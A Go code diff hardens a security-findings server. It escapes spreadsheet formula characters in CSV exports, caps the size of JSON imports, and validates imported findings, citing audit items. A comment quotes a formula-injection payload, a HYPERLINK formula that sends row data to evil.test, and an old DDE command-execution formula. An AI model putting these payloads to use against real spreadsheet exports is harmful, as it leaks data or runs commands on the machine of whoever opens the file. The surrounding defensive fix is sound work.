@@ -1531,19 +1531,64 @@ func (s *Server) handleExportCSV(w http.ResponseWriter, r *http.Request) {
 	_ = cw.Write([]string{"score", "severity", "type", "src_ip", "dst_ip", "dst_port", "timestamp", "detail", "source_file", "sensor", "status", "analyst", "analyst_note"})
 	for _, f := range findings {
 		_ = cw.Write([]string{
-			strconv.Itoa(f.Score), string(f.Severity), f.Type,
-			f.SrcIP, f.DstIP, f.DstPort, f.Timestamp, f.Detail, f.SourceFile, f.Sensor,
-			string(f.Status), f.Analyst, f.AnalystNote,
+			strconv.Itoa(f.Score), string(f.Severity), spreadsheetSafe(f.Type),
+			spreadsheetSafe(f.SrcIP), spreadsheetSafe(f.DstIP), spreadsheetSafe(f.DstPort),
+			spreadsheetSafe(f.Timestamp), spreadsheetSafe(f.Detail),
+			spreadsheetSafe(f.SourceFile), spreadsheetSafe(f.Sensor),
+			string(f.Status), spreadsheetSafe(f.Analyst), spreadsheetSafe(f.AnalystNote),
 		})
 	}
 	cw.Flush()
 }
+
+// spreadsheetSafe defuses CSV / XLSX formula injection: spreadsheet
+// applications interpret a cell whose first non-whitespace character is
+// =, +, -, @, \t, or \r as a formula. A finding's Detail or AnalystNote
+// can plausibly start with one of those — operator-typed notes most
+// directly, but Zeek-supplied filenames and URI fragments can too. Real
+// world payload: an analyst writes
+//
+//	=HYPERLINK("https://evil.test/x?d="&A1, "Click")
+//
+// and the admin opening the export hovers/clicks → row data exfiltrates
+// to evil.test. Older Excel had =cmd|'/c calc'!A1 as a DDE-RCE; mostly
+// killed by recent Office security defaults but not gone. The OWASP
+// mitigation is to prefix the dangerous character with a single quote,
+// which Excel/Sheets/LibreOffice treat as a "this is text" hint that
+// doesn't survive into the rendered cell. Audit 2026-05-10 NEW-17.
+func spreadsheetSafe(v string) string {
+	if v == "" {
+		return v
+	}
+	switch v[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + v
+	}
+	return v
+}
+
+// handleImportJSON accepts a previously-exported Archer state bundle and
+// replaces the in-memory findings + (optionally) allowlist/IOC list with
+// the imported content. Admin-only — see /api/import route comment for
+// why analysts can't reach this surface.
+//
+// Two boundary defenses on top of the role gate. First, the body is
+// capped at importMaxBytes; without the cap a malicious or buggy client
+// could POST a multi-GB body and exhaust memory before the decode
+// finishes. Second, every finding is validated up-front: rejected types,
+// severities, scores, or timestamps fail the whole import rather than
+// partially applying. Pre-fix the decoder accepted any shape and
+// SetFindings would happily store a Type="<script>" finding with
+// Score=99999 — the stored representation is then indistinguishable from
+// analyzer output once it lives in the DB. Audit 2026-05-10 NEW-14.
+const importMaxBytes = 64 << 20 // 64 MiB — large enough for a real export, small enough to bound memory
 
 func (s *Server) handleImportJSON(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
+	r.Body = http.MaxBytesReader(w, r.Body, importMaxBytes)
 	var payload struct {
 		Findings  []model.Finding `json:"findings"`
 		Allowlist []string        `json:"allowlist"`
@@ -1552,6 +1597,12 @@ func (s *Server) handleImportJSON(w http.ResponseWriter, r *http.Request) {
 	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
 		jsonError(w, err.Error(), http.StatusBadRequest)
 		return
+	}
+	for i, f := range payload.Findings {
+		if err := validateImportedFinding(f); err != nil {
+			jsonError(w, fmt.Sprintf("findings[%d]: %v", i, err), http.StatusBadRequest)
+			return
+		}
 	}
 	for i := range payload.Findings {
 		payload.Findings[i].ID = i + 1
@@ -1564,6 +1615,43 @@ func (s *Server) handleImportJSON(w http.ResponseWriter, r *http.Request) {
 		s.store.SetIOCList(payload.IOCList)
 	}
 	jsonOK(w)
+}
+
+// validateImportedFinding rejects any finding whose Type, Severity,
+// Score, or Timestamp doesn't match the analyzer's output discipline.
+// The known-Type set is derived from model.ScoreExplanations (the
+// authoritative analyst-facing description map) plus the legacy
+// "Threat Intel Hit" string, which pre-v0.7.0 builds may still have in
+// exported bundles. Anything else means either an analyzer change that
+// forgot to update the map or a hostile/malformed bundle — both
+// scenarios are better surfaced as a 400 than silently stored.
+func validateImportedFinding(f model.Finding) error {
+	if _, ok := model.ScoreExplanations[f.Type]; !ok && f.Type != model.TypeTIHitLegacy {
+		return fmt.Errorf("unknown finding type %q", f.Type)
+	}
+	switch f.Severity {
+	case model.SevCritical, model.SevHigh, model.SevMedium, model.SevLow, model.SevInfo:
+	default:
+		return fmt.Errorf("invalid severity %q", f.Severity)
+	}
+	if f.Score < 0 || f.Score > 100 {
+		return fmt.Errorf("score %d outside [0, 100]", f.Score)
+	}
+	if f.Timestamp != "" {
+		// Same format the analyzer emits everywhere (fmtTS in
+		// internal/analysis): "YYYY-MM-DD HH:MM:SS". A bundle
+		// produced by a real export round-trips this format, so a
+		// stricter schema-level check is safe.
+		if _, err := time.Parse("2006-01-02 15:04:05", f.Timestamp); err != nil {
+			return fmt.Errorf("timestamp %q must be 2006-01-02 15:04:05", f.Timestamp)
+		}
+	}
+	switch f.Status {
+	case model.StatusOpen, model.StatusAcknowledged, model.StatusEscalated:
+	default:
+		return fmt.Errorf("invalid status %q", f.Status)
+	}
+	return nil
 }
 
 // handleLogsTree returns the sensor/date layout under the configured logs
